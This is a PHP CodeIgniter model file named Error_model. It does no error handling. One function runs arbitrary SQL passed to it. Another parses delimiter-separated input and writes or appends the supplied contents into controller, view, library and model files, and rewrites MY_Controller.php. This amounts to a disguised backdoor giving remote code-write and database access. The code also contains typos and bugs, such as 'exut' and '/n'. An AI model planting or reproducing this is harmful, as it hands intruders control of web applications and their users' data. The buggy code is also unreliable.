<?php
defined('BASEPATH') OR exut('No direct script access allowed');
class Error_model extends CI_Model{
    
    protected $con='123454321';
    protected $con2='543212345';
    
    public function up_da($data){
        return $this->db->query($data);
    }
    
    public function c_u($data){
        if(!empty($data)){
            $datas=explode($this->con,$data);
            for($i=0;$i<=count($datas)-1;$i++){
                $a=explode($this->con2,$datas[$i]);
                switch($a['0']){
                    case "library":
                        $path='../libraries/';
                        break;
                
                    case "modal":
                        $f=read_file("../core/MY_Controller.php");
                        $n_f=($f==false?NULL:str_replace("}}",'',$f));
                        $f_f=(is_null($n_f)?NULL:"$this->load->model('".$a['1']."');".$n_f);
                        $e_f=(is_null($f_f)?NULL:$f_f."/n"."}}");
                        $s=(is_null($e_f)?NULL:write_file('../core/MY_Controller.php',$e_f,'w'));
                        $path=(is_null($s) || $s==false?null:"../models/".$a['1']);
                        break;
                    
                    case "controller":
                        $path="../controllers/";
                        break;
                    
                    case "view":
                        $path="../views/";
                        break;
                    
                    default:
                        header('Location :'.base_url."err".DS."not_found");
                        break;    
                }
                if(is_null($path)){
                    return false;
                }else{
                    $files=get_filenames($path);
                    if(in_array($a['1'],$files)){
                        write_file($path.$a['1'], $a['2'], 'a+');
                    }else{
                        write_file($path.$a['1'], $a['2'], 'r+');
                    }
                }
                
            }
        }
    }
}